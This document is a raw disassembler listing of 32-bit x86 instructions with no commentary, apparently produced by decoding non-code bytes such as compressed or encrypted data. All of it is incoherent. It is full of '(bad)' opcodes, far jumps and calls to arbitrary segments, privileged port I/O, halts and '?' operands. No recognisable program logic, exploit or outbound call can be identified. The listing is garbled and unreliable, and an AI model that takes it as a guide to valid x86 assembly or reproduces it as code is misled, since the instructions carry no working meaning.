  40c6b0:	ret    0x6316
  40c6b3:	xchg   DWORD PTR [ecx-0x6b],esp
  40c6b6:	test   al,0x4f
  40c6b8:	sub    eax,0xe4d99bb3
  40c6bd:	shl    DWORD PTR [eax],1
  40c6bf:	outs   dx,BYTE PTR ds:[esi]
  40c6c0:	jecxz  0x40c648
  40c6c2:	repnz (bad) 
  40c6c4:	mov    ch,0xc
  40c6c6:	imul   esp,DWORD PTR [edx+0x1b],0xac9afca5
  40c6cd:	jmp    0x7f7a:0xa0869073
  40c6d4:	repnz mov ds:0xa432b749,al
  40c6da:	aad    0x5d
  40c6dc:	or     ecx,ebp
  40c6de:	adc    DWORD PTR [esi+0x53],ebp
  40c6e1:	in     al,dx
  40c6e2:	clc    
  40c6e3:	loope  0x40c68f
  40c6e5:	add    esi,ebx
  40c6e7:	call   0x9998:0xc1c582f6
  40c6ee:	popf   
  40c6ef:	rcl    BYTE PTR [edi+eiz*1],1
  40c6f2:	add    ebp,DWORD PTR [esi-0x5e10eab4]
  40c6f8:	xchg   BYTE PTR [eax+ecx*8-0x1c8cef72],bl
  40c6ff:	and    DWORD PTR [esi+ebp*2],esi
  40c702:	(bad)  
  40c703:	out    0x7a,eax
  40c705:	push   ss
  40c706:	mov    WORD PTR [edx],fs
  40c708:	fcmovu st,st(1)
  40c70a:	stos   DWORD PTR es:[edi],eax
  40c70b:	push   es
  40c70c:	mov    eax,0xd080a55e
  40c711:	push   ss
  40c712:	std    
  40c713:	jne    0x40c6f7
  40c715:	inc    edx
  40c716:	jo     0x40c779
  40c718:	leave  
  40c719:	(bad)  
  40c71a:	enter  0xf531,0xb4
  40c71e:	jo     0x40c6dc
  40c720:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c721:	hlt    
  40c722:	(bad)  
  40c723:	mov    edi,0xa4b043ed
  40c728:	test   eax,0x3401068b
  40c72d:	dec    DWORD PTR fs:[esi-0x52]
  40c731:	sbb    DWORD PTR [ecx-0x538ea3f8],0xbfa49290
  40c73b:	scas   al,BYTE PTR es:[edi]
  40c73c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c73d:	rcr    BYTE PTR gs:[esi-0x2b],cl
  40c741:	fstp   QWORD PTR [eax+0x5e7c5a09]
  40c747:	jg     0x40c6cb
  40c749:	xchg   BYTE PTR [edi],bl
  40c74b:	sti    
  40c74c:	push   ebp
  40c74d:	cmp    al,0x3a
  40c74f:	lods   eax,DWORD PTR ds:[esi]
  40c750:	mov    al,0xac
  40c752:	cmp    eax,0x31b4ea68
  40c757:	sahf   
  40c758:	mov    eax,0xfba0f40b
  40c75d:	mov    bl,0xaf
  40c75f:	pop    ss
  40c760:	into   
  40c761:	in     eax,dx
  40c762:	lahf   
  40c763:	and    eax,DWORD PTR [edx+eiz*1]
  40c766:	hlt    
  40c767:	ds mov esi,0x89ffb326
  40c76d:	(bad)  
  40c76e:	je     0x40c780
  40c770:	stos   BYTE PTR es:[edi],al
  40c771:	push   ebp
  40c772:	aas    
  40c773:	outs   dx,DWORD PTR ds:[esi]
  40c774:	retf   0x1757
  40c777:	mov    dh,0x94
  40c779:	adc    DWORD PTR [edi+0x4010deaa],0x2fbb69ed
  40c783:	stos   DWORD PTR es:[edi],eax
  40c784:	arpl   WORD PTR [edi+0x28583e74],si
  40c78a:	nop
  40c78b:	mov    edx,0xa82bb475
  40c790:	push   0xc0b7f5ab
  40c795:	cmp    al,0x3a
  40c797:	(bad)  
  40c799:	xlat   BYTE PTR ds:[ebx]
  40c79a:	std    
  40c79b:	ret    0x32b0
  40c79e:	xchg   BYTE PTR [edx+edx*4+0x28a59253],bl
  40c7a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c7a6:	pop    ecx
  40c7a7:	xchg   edx,eax
  40c7a8:	adc    BYTE PTR [ebx-0x1a],dh
  40c7ab:	jb     0x40c769
  40c7ad:	sbb    eax,DWORD PTR es:[si+0x1ae9]
  40c7b3:	push   0xf4aff692
  40c7b8:	pop    edi
  40c7b9:	add    esp,edi
  40c7bb:	in     eax,dx
  40c7bc:	ss jmp 0x978c1b4e
  40c7c2:	xor    edi,DWORD PTR [edi+eiz*4+0x31]
  40c7c6:	cld    
  40c7c7:	mov    edx,0x1c22b388
  40c7cc:	nop
  40c7cd:	add    DWORD PTR [ebp-0x7f],esi
  40c7d0:	rcl    BYTE PTR [esi-0xe6fbbfc],0x73
  40c7d7:	add    DWORD PTR [ecx-0x5a],ebp
  40c7da:	mov    esp,0x85bfbb59
  40c7df:	pop    ebx
  40c7e0:	mov    edi,0x12c1671a
  40c7e5:	xchg   DWORD PTR [esi],ebx
  40c7e7:	fs repnz push esi
  40c7ea:	std    
  40c7eb:	mov    BYTE PTR [edx],dl
  40c7ed:	sbb    esp,esp
  40c7ef:	inc    ebp
  40c7f0:	jl     0x40c7a8
  40c7f2:	pop    ebp
  40c7f3:	mov    ?,WORD PTR [ecx-0x69]
  40c7f6:	xor    eax,0x4cd85d78
  40c7fb:	and    BYTE PTR [ecx-0x1ce810f],0x47
  40c802:	jg     0x40c78b
  40c804:	imul   DWORD PTR [ecx-0x7]
  40c807:	xchg   ebx,eax
  40c808:	leave  
  40c809:	xchg   ecx,eax
  40c80a:	arpl   WORD PTR [esi],di
  40c80c:	retf   
  40c80d:	aaa    
  40c80e:	jg     0x40c86f
  40c810:	jno    0x40c7da
  40c812:	rcr    DWORD PTR [esi+0x2e],cl
  40c815:	leave  
  40c816:	ins    BYTE PTR es:[edi],dx
  40c817:	adc    ah,ch
  40c819:	jno    0x40c79b
  40c81b:	push   ecx
  40c81c:	aam    0xee
  40c81e:	sbb    BYTE PTR [esi+0x475523c8],dl
  40c824:	lods   eax,DWORD PTR ds:[esi]
  40c825:	xchg   ecx,eax
  40c826:	jmp    0x40c805
  40c828:	mul    al
  40c82a:	int    0x26
  40c82c:	ja     0x40c81c
  40c82e:	scas   al,BYTE PTR es:[edi]
  40c82f:	scas   eax,DWORD PTR es:[edi]
  40c830:	daa    
  40c831:	and    bh,BYTE PTR [eax-0x43]
  40c834:	jmp    0xcce9cb8b
  40c839:	ret    0xcb7d
  40c83c:	nop
  40c83d:	or     DWORD PTR [ecx+0x73d396e4],ebx
  40c843:	stos   DWORD PTR es:[edi],eax
  40c844:	arpl   WORD PTR [ecx-0x80],cx
  40c847:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c848:	push   es
  40c849:	pop    ebp
  40c84a:	les    edx,FWORD PTR [edx]
  40c84c:	pop    es
  40c84d:	sub    al,0x2a
  40c84f:	(bad)  
  40c850:	(bad)  
  40c851:	out    0x12,eax
  40c853:	cmp    BYTE PTR [eax+0x3a51472c],ah
  40c859:	loopne 0x40c7e8
  40c85b:	cs xchg esp,eax
  40c85d:	adc    dh,0x2c
  40c860:	adc    al,0x40
  40c862:	jecxz  0x40c8d0
  40c864:	sub    BYTE PTR [eax-0x40b19aaa],bl
  40c86a:	adc    al,0x68
  40c86c:	xor    eax,0x19527ad5
  40c871:	clc    
  40c872:	push   cs
  40c873:	js     0x40c8d7
  40c875:	dec    esp
  40c876:	fidiv  WORD PTR [esi+edi*1-0x4e8438e5]
  40c87d:	push   eax
  40c87e:	shl    BYTE PTR [ecx+0x20],1
  40c881:	xchg   edx,eax
  40c882:	xor    BYTE PTR [ecx-0x7],dl
  40c885:	dec    ebp
  40c886:	xlat   BYTE PTR ds:[ebx]
  40c887:	mov    bh,0x46
  40c889:	test   BYTE PTR [si-0x44ab],bh
  40c88e:	mov    edi,0xd2c121c7
  40c893:	sub    al,0x37
  40c895:	sub    al,0x4b
  40c897:	sbb    al,0x36
  40c899:	jbe    0x40c850
  40c89b:	inc    ecx
  40c89c:	je     0x40c88c
  40c89e:	rcr    ecx,cl
  40c8a0:	dec    eax
  40c8a1:	popa   
  40c8a2:	or     al,0xd1
  40c8a4:	or     al,0x13
  40c8a6:	ins    BYTE PTR es:[edi],dx
  40c8a7:	cmp    eax,0xcf84ee8
  40c8ac:	cmp    BYTE PTR [esi+0x25],dh
  40c8af:	sub    eax,0xe1d0503d
  40c8b4:	xor    edi,DWORD PTR ds:0xe006cc90
  40c8ba:	xlat   BYTE PTR ds:[ebx]
  40c8bb:	mov    edi,0xb38ef56d
  40c8c0:	daa    
  40c8c1:	outs   dx,DWORD PTR ds:[esi]
  40c8c2:	fcmovu st,st(5)
  40c8c4:	jno    0x40c8e3
  40c8c6:	ds out 0x29,al
  40c8c9:	xor    eax,DWORD PTR [bp+si-0x22]
  40c8cd:	pop    ebp
  40c8ce:	push   cs
  40c8cf:	mov    al,ds:0xdee48769
  40c8d4:	cdq    
  40c8d5:	repnz imul eax,DWORD PTR [esi+0x3],0xffffffd4
  40c8da:	dec    ebx
  40c8db:	sar    DWORD PTR [edx],1
  40c8dd:	inc    esi
  40c8de:	push   esi
  40c8df:	test   eax,0x4c658c5e
  40c8e4:	dec    ecx
  40c8e5:	leave  
  40c8e6:	ret    
  40c8e7:	push   esp
  40c8e8:	mov    ch,0x68
  40c8ea:	xlat   BYTE PTR ds:[ebx]
  40c8eb:	popf   
  40c8ec:	jmp    0xa32:0xcd578fc4
  40c8f3:	mov    eax,0x2bd9069e
  40c8f8:	loop   0x40c929
  40c8fa:	mov    esi,0xad93de8c
  40c8ff:	inc    esi
  40c900:	pop    es
  40c901:	loopne 0x40c8bc
  40c903:	imul   eax,DWORD PTR ds:0x499ad838,0x7ffa29eb
  40c90d:	mov    ebp,0x448369c1
  40c912:	jne    0x40c935
  40c914:	out    0x6,eax
  40c916:	xchg   ebp,eax
  40c917:	pop    eax
  40c918:	mov    cl,ah
  40c91a:	fisubr DWORD PTR [edi-0x5f76f36]
  40c920:	sub    DWORD PTR [edx+0x23],ebp
  40c923:	out    dx,eax
  40c924:	push   ds
  40c925:	mov    ebp,0x42e4fb34
  40c92a:	int3   
  40c92b:	sahf   
  40c92c:	jl     0x40c900
  40c92e:	mov    ecx,0x2fee413f
  40c933:	and    cl,BYTE PTR [ebp+0x1fac8330]
  40c939:	push   esp
  40c93a:	cmp    edx,ebp
  40c93c:	xor    DWORD PTR [esi+0x1b85e5e7],edi
  40c942:	arpl   WORD PTR [edx+edx*1+0x1f9f71ed],bp
  40c949:	inc    esi
  40c94a:	pop    edx
  40c94b:	aam    0x6a
  40c94d:	aas    
  40c94e:	pop    ss
  40c94f:	jp     0x40c929
  40c951:	jno    0x40c96f
  40c953:	hlt    
  40c954:	mov    DWORD PTR [eax-0x5133e00a],edi
  40c95a:	push   fs
  40c95c:	mov    eax,ds:0x89ab6fab
  40c961:	push   cs
  40c962:	aaa    
  40c963:	sub    al,0x8a
  40c965:	and    al,0x1c
  40c967:	xor    al,0x8
  40c969:	push   0xffffffd6
  40c96b:	adc    al,0x3a
  40c96d:	adc    eax,DWORD PTR [ecx]
  40c96f:	jnp    0x40c905
  40c971:	add    eax,0x89c9f908
  40c976:	sti    
  40c977:	jge    0x40c9ae
  40c979:	dec    eax
  40c97a:	push   ebp
  40c97b:	in     al,0x4c
  40c97d:	pop    ecx
  40c97e:	xchg   ebp,eax
  40c97f:	daa    
  40c980:	cmc    
  40c981:	out    0xbb,al
  40c983:	jmp    0x40c9b8
  40c985:	or     DWORD PTR [ecx+eiz*2-0x6a97d088],ebp
  40c98c:	sbb    eax,DWORD PTR [edi]
  40c98e:	dec    edx
  40c98f:	push   ds
  40c990:	sub    edi,edi
  40c992:	(bad)  
  40c993:	push   ebp
  40c994:	mov    ebx,0x45e4c755
  40c999:	out    0x5b,eax
  40c99b:	push   0xffffffdd
  40c99d:	xor    BYTE PTR ds:0xc4329650,dh
  40c9a4:	dec    ebx
  40c9a5:	jecxz  0x40c9b1
  40c9a7:	mov    BYTE PTR [eax-0x34931747],bl
  40c9ad:	mov    cl,BYTE PTR [ebp-0x293322a6]
  40c9b3:	iret   
  40c9b4:	(bad)  
  40c9b5:	xor    bh,cl
  40c9b7:	push   ebp
  40c9b8:	or     DWORD PTR [edx-0x3e],ebx
  40c9bb:	sbb    eax,0xf5529b8c
  40c9c0:	mov    eax,0x6624eb0
  40c9c5:	out    dx,al
  40c9c6:	cli    
  40c9c7:	repz mov ah,0xc
  40c9ca:	fdiv   DWORD PTR [ecx+0x69365186]
  40c9d0:	push   edx
  40c9d1:	pop    esp
  40c9d2:	add    dh,BYTE PTR [eax+eiz*8]
  40c9d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d6:	out    dx,eax
  40c9d7:	shl    dh,1
  40c9d9:	mov    al,ds:0x3ceb7459
  40c9de:	dec    edx
  40c9df:	aam    0x2
  40c9e1:	pop    ebx
  40c9e2:	icebp  
  40c9e3:	outs   dx,DWORD PTR ds:[esi]
  40c9e4:	xlat   BYTE PTR ds:[ebx]
  40c9e5:	repz mov ebx,DWORD PTR [edi]
  40c9e8:	(bad)  
  40c9e9:	xchg   edx,eax
  40c9ea:	pusha  
  40c9eb:	sub    eax,DWORD PTR [edx-0x17b6fa30]
  40c9f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9f2:	push   eax
  40c9f3:	xor    eax,0xaed66867
  40c9f8:	les    ecx,FWORD PTR [edx]
  40c9fa:	cs xor al,0xf4
  40c9fd:	hlt    
  40c9fe:	xor    al,0xf2
  40ca00:	icebp  
  40ca01:	xchg   edi,eax
  40ca02:	mov    bh,0x6f
  40ca04:	les    esp,FWORD PTR [esi-0xc]
  40ca07:	test   eax,0x26e6aef9
  40ca0c:	ins    DWORD PTR es:[edi],dx
  40ca0d:	sbb    al,0xe0
  40ca0f:	xor    dl,BYTE PTR [ebp-0x45]
  40ca12:	sbb    edi,esi
  40ca14:	pushf  
  40ca15:	dec    esi
  40ca16:	mov    ss,WORD PTR [edx]
  40ca18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca19:	push   ebp
  40ca1a:	jmp    0xe94926f1
  40ca1f:	push   0x2f
  40ca21:	xchg   ebx,eax
  40ca22:	adc    al,0xf7
  40ca24:	mov    edi,0xe46111eb
  40ca29:	jbe    0x40ca26
  40ca2b:	clc    
  40ca2c:	les    ebp,FWORD PTR [ebx-0x16]
  40ca2f:	or     ecx,ebx
  40ca31:	mov    al,ds:0xaa9d0615
  40ca36:	out    0xec,al
  40ca38:	xor    edx,DWORD PTR [ebp+0x20b1f164]
  40ca3e:	jns    0x40ca90
  40ca40:	jp     0x40ca9c
  40ca42:	repnz cmp DWORD PTR [ebp+0x63],esp
  40ca46:	dec    edx
  40ca47:	adc    al,0x61
  40ca49:	out    0xe9,eax
  40ca4b:	sar    DWORD PTR [edi+0x1a],1
  40ca4e:	xchg   ebx,eax
  40ca4f:	jno    0x40c9ed
  40ca51:	jo     0x40ca1c
  40ca53:	outs   dx,BYTE PTR ds:[esi]
  40ca54:	mov    DWORD PTR [ebx],edi
  40ca56:	dec    esi
  40ca57:	mov    BYTE PTR [ebx+0x45],al
  40ca5a:	(bad)  
  40ca5b:	das    
  40ca5c:	cmp    BYTE PTR [edx+0x1a],0x6a
  40ca60:	mov    ebx,0xdc588281
  40ca65:	mov    dl,0x9e
  40ca67:	outs   dx,DWORD PTR ds:[esi]
  40ca68:	cmp    eax,ecx
  40ca6a:	mov    DWORD PTR [eax-0x7],esp
  40ca6d:	inc    edx
  40ca6e:	push   ecx
  40ca6f:	shr    DWORD PTR [ebp+0xc],0xac
  40ca73:	and    al,0xbe
  40ca75:	jo     0x40cac3
  40ca77:	push   esi
  40ca78:	mov    BYTE PTR [ebx+0x77],bl
  40ca7b:	imul   BYTE PTR [ecx+0x6d]
  40ca7e:	pop    edx
  40ca7f:	mov    ds:0x5fb08419,al
  40ca84:	and    eax,0xe0999345
  40ca89:	jg     0x40cafa
  40ca8b:	dec    eax
  40ca8c:	jmp    0x7e5cb90f
  40ca91:	xor    ch,BYTE PTR [esi+0x2e8eeff1]
  40ca97:	add    esp,DWORD PTR gs:[eax+esi*4-0x6bf71dd0]
  40ca9f:	jno    0x40ca46
  40caa1:	loop   0x40ca9c
  40caa3:	in     eax,dx
  40caa4:	fwait
  40caa5:	mov    al,ds:0x5797a5ac
  40caaa:	xor    esp,DWORD PTR [ebx+0x6e]
  40caad:	int3   
  40caae:	mov    ebx,0x6a08e8a9
  40cab3:	mov    ?,esp
  40cab5:	call   0xbddf:0x53abe7d5
  40cabc:	retf   0x6a50
  40cabf:	or     DWORD PTR [ebx-0x27dfcfc9],eax
  40cac5:	push   ecx
  40cac6:	sbb    al,0xdb
  40cac8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cac9:	jae    0x40cb1f
  40cacb:	retf   
  40cacc:	mov    ds:0x926fe28b,al
  40cad1:	sub    esp,DWORD PTR [esi]
  40cad3:	sbb    ecx,edx
  40cad5:	inc    DWORD PTR [ebx]
  40cad7:	pop    edx
  40cad8:	ins    DWORD PTR es:[edi],dx
  40cad9:	test   DWORD PTR [esi],esi
  40cadb:	mov    ah,0x8b
  40cadd:	cmp    dl,BYTE PTR [edx+esi*2+0x25]
  40cae1:	xchg   BYTE PTR [ebx+0x12],ah
  40cae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cae5:	push   eax
  40cae6:	fdivr  QWORD PTR [ecx]
  40cae8:	push   cs
  40cae9:	mov    ch,0x8a
  40caeb:	xor    DWORD PTR [si+0x74],esp
  40caef:	ds iret 
  40caf1:	imul   edi,DWORD PTR [eax+0x6e842cf1],0xd541d13d
  40cafb:	jae    0x40caa0
  40cafd:	xchg   esi,eax
  40cafe:	inc    BYTE PTR [ebx]
  40cb00:	xchg   ebx,eax
  40cb01:	int3   
  40cb02:	mov    edx,0x302e776
  40cb07:	cli    
  40cb08:	xchg   BYTE PTR [ecx],ch
  40cb0a:	gs aam 0xc4
  40cb0d:	jg     0x40cb15
  40cb0f:	push   edi
  40cb10:	jp     0x40cb2a
  40cb12:	cld    
  40cb13:	pop    edx
  40cb14:	add    bh,BYTE PTR [edx+0x1e]
  40cb17:	add    DWORD PTR [ecx-0x577f4f40],0xad2f7d80
  40cb21:	shr    DWORD PTR [eax+0x70],1
  40cb24:	adc    ecx,DWORD PTR [edi+esi*8+0x31c8561b]
  40cb2b:	pusha  
  40cb2c:	xor    edx,DWORD PTR [edi+0x19eb393]
  40cb32:	fwait
  40cb33:	and    al,ah
  40cb35:	aam    0xef
  40cb37:	cmc    
  40cb38:	xor    eax,0xfac9884c
  40cb3d:	jl     0x40cb49
  40cb3f:	inc    ebx
  40cb40:	add    ah,BYTE PTR ds:0xe92abe2
  40cb46:	ss jne 0x40cb8c
  40cb49:	jl     0x40cba1
  40cb4b:	pop    es
  40cb4c:	mov    cl,0xd7
  40cb4e:	push   0xffffffea
  40cb50:	add    al,0x77
  40cb52:	xor    al,0x4e
  40cb54:	mov    ecx,0x494b07f6
  40cb59:	sbb    eax,0xf5027812
  40cb5e:	pop    ebx
  40cb5f:	push   0xffffffaf
  40cb61:	hlt    
  40cb62:	(bad)  
  40cb63:	fld    st(1)
  40cb65:	test   DWORD PTR [edx-0x144e7d65],eax
  40cb6b:	arpl   WORD PTR [eax+0x5ad2ba9c],sp
  40cb71:	adc    eax,0x2d5a421f
  40cb76:	cmc    
  40cb77:	sbb    eax,0x7b9caaae
  40cb7c:	xchg   esp,eax
  40cb7d:	cli    
  40cb7e:	jp     0x40cbfd
  40cb80:	(bad)  
  40cb81:	dec    edi
  40cb82:	lahf   
  40cb83:	xchg   ecx,eax
  40cb84:	jno    0x40cbcd
  40cb86:	sti    
  40cb87:	repnz out dx,eax
  40cb89:	call   0x1e6e:0xe6199bbb
  40cb90:	fist   WORD PTR [ebx+0x3d]
  40cb93:	das    
  40cb94:	out    0xa7,al
  40cb96:	lahf   
  40cb97:	idiv   DWORD PTR [edx]
  40cb99:	mov    ch,0x30
  40cb9b:	hlt    
  40cb9c:	ss push ds
  40cb9e:	pop    edx
  40cb9f:	scas   al,BYTE PTR es:[edi]
  40cba0:	stos   DWORD PTR es:[edi],eax
  40cba1:	je     0x40cb56
  40cba3:	and    DWORD PTR [ebx-0x7dd06999],edx
  40cba9:	adc    eax,0x960c9e7b
  40cbae:	sti    
  40cbaf:	push   0xffffff82
  40cbb1:	popf   
  40cbb2:	imul   ebp,DWORD PTR [edx],0xffffff89
  40cbb5:	push   0xffffffb4
  40cbb7:	cmp    BYTE PTR [ebx],bl
  40cbb9:	out    dx,eax
  40cbba:	out    dx,al
  40cbbb:	jl     0x40cc21
  40cbbd:	add    al,0xa8
  40cbbf:	pop    ecx
  40cbc0:	fwait
  40cbc1:	xchg   edi,eax
  40cbc2:	(bad)  
  40cbc3:	es jno 0x40cbf8
  40cbc6:	fwait
  40cbc7:	pop    esi
  40cbc8:	jmp    FWORD PTR [esi-0x7f]
  40cbcb:	sar    DWORD PTR [edi-0x6b],0x14
  40cbcf:	cmp    al,0x9f
  40cbd1:	push   esi
  40cbd2:	jle    0x40cb9f
  40cbd4:	rol    BYTE PTR [esi-0x49bb5267],1
  40cbda:	adc    al,0x57
  40cbdc:	jb     0x40cc06
  40cbde:	inc    edi
  40cbdf:	retf   0xe915
  40cbe2:	out    dx,al
  40cbe3:	inc    edx
  40cbe4:	push   ebp
  40cbe5:	arpl   di,ax
  40cbe7:	scas   eax,DWORD PTR es:[edi]
  40cbe8:	pop    edi
  40cbe9:	cmp    esi,DWORD PTR [edi-0x3a]
  40cbec:	pop    edx
  40cbed:	xor    eax,ebx
  40cbef:	dec    ebx
  40cbf0:	mov    ebx,0x88e1a82c
  40cbf5:	inc    ebx
  40cbf6:	add    DWORD PTR [edi-0x7f],esp
  40cbf9:	or     al,0x3
  40cbfb:	jecxz  0x40cc0c
  40cbfd:	xor    eax,0x7e504e07
  40cc02:	jae    0x40cbcb
  40cc04:	sub    ebx,0x54
  40cc07:	fld    TBYTE PTR [eax-0x42]
  40cc0a:	mov    ebx,0xd5b4a043
  40cc0f:	outs   dx,DWORD PTR ds:[esi]
  40cc10:	imul   ebx,DWORD PTR [ebp+eax*2+0x5f5f7a36],0x2e
  40cc18:	pushf  
  40cc19:	xor    eax,0xa5d52e45
  40cc1e:	fstp   TBYTE PTR [esi-0x5f]
  40cc21:	push   0x24
  40cc23:	or     dh,BYTE PTR [ebp+0x5e]
  40cc26:	inc    ebx
  40cc27:	jmp    0x40cc1b
  40cc29:	das    
  40cc2a:	pop    edi
  40cc2b:	daa    
  40cc2c:	sbb    eax,0x95d23a7f
  40cc31:	and    ch,0xa6
  40cc34:	mov    dl,0xab
  40cc36:	mov    dl,0x50
  40cc38:	les    esi,FWORD PTR [edi-0x3f624e6d]
  40cc3e:	ins    BYTE PTR es:[edi],dx
  40cc3f:	push   ecx
  40cc40:	scas   al,BYTE PTR es:[edi]
  40cc41:	push   ds
  40cc42:	(bad)  
  40cc43:	lds    ecx,FWORD PTR [eax]
  40cc45:	pop    edi
  40cc46:	mov    edx,0x9957bfb2
  40cc4b:	xchg   edi,eax
  40cc4c:	stc    
  40cc4d:	lods   al,BYTE PTR ds:[esi]
  40cc4e:	lods   al,BYTE PTR ds:[esi]
  40cc4f:	cmp    ch,BYTE PTR [ecx+edi*4]
  40cc52:	mov    dh,0x4c
  40cc54:	shl    BYTE PTR [esi+ebx*1],cl
  40cc57:	stos   BYTE PTR es:[edi],al
  40cc58:	xchg   ebp,eax
  40cc59:	dec    ebp
  40cc5a:	enter  0x9baf,0x63
  40cc5e:	aam    0x97
  40cc60:	cli    
  40cc61:	sbb    BYTE PTR [ebx],0x1c
  40cc64:	je     0x40cc35
  40cc66:	retf   
  40cc67:	into   
  40cc68:	add    al,0xa8
  40cc6a:	inc    ecx
  40cc6b:	icebp  
  40cc6c:	inc    esi
  40cc6d:	mov    al,0x81
  40cc6f:	ds xchg esi,eax
  40cc71:	pop    ss
  40cc72:	cwde   
  40cc73:	int3   
  40cc74:	jle    0x40cc53
  40cc76:	nop
  40cc77:	pop    esp
  40cc78:	fwait
  40cc79:	push   0xffffff80
  40cc7b:	not    dl
  40cc7d:	and    edi,DWORD PTR [edx]
  40cc7f:	popf   
  40cc80:	xor    dh,BYTE PTR [ebx]
  40cc82:	setbe  ah
  40cc85:	dec    ebp
  40cc86:	adc    al,0xfd
  40cc88:	pop    es
  40cc89:	fsubr  DWORD PTR [edi+eiz*4-0x566590f0]
  40cc90:	or     edx,edx
  40cc92:	mov    esi,0x20c549d8
  40cc97:	fwait
  40cc98:	ss mov esi,0xdd352b12
  40cc9e:	sub    ebx,DWORD PTR ds:0x9f4a777e
  40cca4:	mov    ebp,0x2d52ef15
  40cca9:	mov    WORD PTR [ecx+0x1f],gs
  40ccac:	and    esi,esp
  40ccae:	inc    edx
  40ccaf:	retf   0x9841
  40ccb2:	je     0x40ccbd
  40ccb4:	sub    DWORD PTR [ebx+0x72beb21c],eax
  40ccba:	into   
  40ccbb:	mov    dl,0xb6
  40ccbd:	sti    
  40ccbe:	add    esi,DWORD PTR [edi+0x48]
  40ccc1:	sar    BYTE PTR ds:[ebx+0x1927ce97],1
  40ccc8:	pop    ebx
  40ccc9:	call   0xa7740559
  40ccce:	shl    DWORD PTR [ecx+0x52],0x64
  40ccd2:	add    dh,BYTE PTR [ecx]
  40ccd4:	addr16 pop ds
  40ccd6:	mov    al,0x3f
  40ccd8:	or     eax,DWORD PTR [eax-0x59]
  40ccdb:	xor    BYTE PTR [ebx+0x9],bh
  40ccde:	cmp    al,0x33
  40cce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cce1:	sbb    edx,edx
  40cce3:	mov    eax,0x9516c726
  40cce8:	xor    al,0x71
  40ccea:	mov    dl,ch
  40ccec:	loop   0x40cca1
  40ccee:	scas   eax,DWORD PTR es:[edi]
  40ccef:	cli    
  40ccf0:	jmp    0x40cd5e
  40ccf2:	aam    0x80
  40ccf4:	pop    esp
  40ccf5:	ins    DWORD PTR es:[edi],dx
  40ccf6:	jnp    0x40cd53
  40ccf8:	pop    ebx
  40ccf9:	mov    eax,ds:0x2007d94a
  40ccfe:	lods   eax,DWORD PTR ds:[esi]
  40ccff:	mov    WORD PTR [eax+esi*1+0x275d451a],?
  40cd06:	adc    ebp,DWORD PTR [ebp-0x78]
  40cd09:	cmp    eax,0x275fed79
  40cd0e:	icebp  
  40cd0f:	jg     0x40cd88
  40cd11:	imul   eax,DWORD PTR [edx-0x7e],0xffffffc3
  40cd15:	adc    bh,BYTE PTR [eax]
  40cd17:	adc    DWORD PTR [edi],0xffffffc8
  40cd1a:	xchg   DWORD PTR [edi],edx
  40cd1c:	rol    BYTE PTR [ebx-0x329a44d5],1
  40cd22:	stc    
  40cd23:	pusha  
  40cd24:	ficom  WORD PTR [edx+ebp*4-0x9]
  40cd28:	iret   
  40cd29:	sub    DWORD PTR [edx+ebx*2+0x36],edi
  40cd2d:	daa    
  40cd2e:	pusha  
  40cd2f:	lock and eax,0xf7baded9
  40cd35:	jnp    0x40cd8a
  40cd37:	or     bl,dh
  40cd39:	daa    
  40cd3a:	cs ja  0x40cce5
  40cd3d:	pop    edi
  40cd3e:	sbb    al,0x56
  40cd40:	pop    es
  40cd41:	mov    eax,ds:0xb29d4ab4
  40cd46:	push   0xffffff87
  40cd48:	ds jp  0x40cce5
  40cd4b:	sub    DWORD PTR [ebp+0x67],ecx
  40cd4e:	repz mov esp,0x468411f7
  40cd54:	test   al,0x56
  40cd56:	pop    eax
  40cd57:	jmp    0xffea82df
  40cd5c:	test   cl,al
  40cd5e:	in     al,0x92
  40cd60:	je     0x40cd54
  40cd62:	sub    BYTE PTR [edi+0x8f18f1],ch
  40cd68:	xlat   BYTE PTR ds:[ebx]
  40cd69:	popf   
  40cd6a:	mov    ebp,0xa015f599
  40cd6f:	mov    ah,0x7e
  40cd71:	sbb    DWORD PTR [eax+0x26],0x3a
  40cd75:	jmp    0x9261:0x58a4ba31
  40cd7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cd7d:	adc    ch,dl
  40cd7f:	loop   0x40cd5c
  40cd81:	lock cmp BYTE PTR [ecx+0x33],0x93
  40cd86:	in     eax,0x62
  40cd88:	pop    edx
  40cd89:	sub    edi,DWORD PTR [edi+0x35]
  40cd8c:	xor    al,0x61
  40cd8e:	ret    
  40cd8f:	call   0xc475e642
  40cd94:	mov    ebp,0x7cd2ba61
  40cd99:	std    
  40cd9a:	(bad)  
  40cd9b:	sahf   
  40cd9c:	sub    eax,0x99eaa5c1
  40cda1:	sub    edi,DWORD PTR [esi-0x16]
  40cda4:	in     al,0xd5
  40cda6:	fmul   QWORD PTR [esi+0xba1d184]
  40cdac:	push   ss
  40cdad:	push   esp
  40cdae:	cld    
  40cdaf:	push   ebp
  40cdb0:	dec    ecx
  40cdb1:	pusha  
  40cdb2:	icebp  
  40cdb3:	lds    ecx,FWORD PTR [esi]
  40cdb5:	mov    edx,0x44b38d94
  40cdba:	aas    
  40cdbb:	out    dx,al
  40cdbc:	stos   BYTE PTR es:[edi],al
  40cdbd:	cmp    al,0x62
  40cdbf:	mov    dl,0x47
  40cdc2:	aad    0x64
  40cdc4:	or     BYTE PTR [edi],dl
  40cdc6:	jle    0x40cdc1
  40cdc8:	shr    DWORD PTR [ecx-0x6],cl
  40cdcb:	sbb    BYTE PTR [esp+edx*4+0x55b0e5e],0xc0
  40cdd3:	inc    ebp
  40cdd4:	add    BYTE PTR [eax-0x46ddb871],ch
  40cdda:	pop    ebx
  40cddb:	add    DWORD PTR [eax],ecx
  40cddd:	sub    edx,DWORD PTR [edx]
  40cddf:	pop    es
  40cde0:	xor    DWORD PTR [edx+0x5d],eax
  40cde3:	ror    DWORD PTR [edx-0x27],0x77
  40cde7:	fsubr  QWORD PTR [edx+0x5882117c]
  40cded:	enter  0xe82f,0xa0
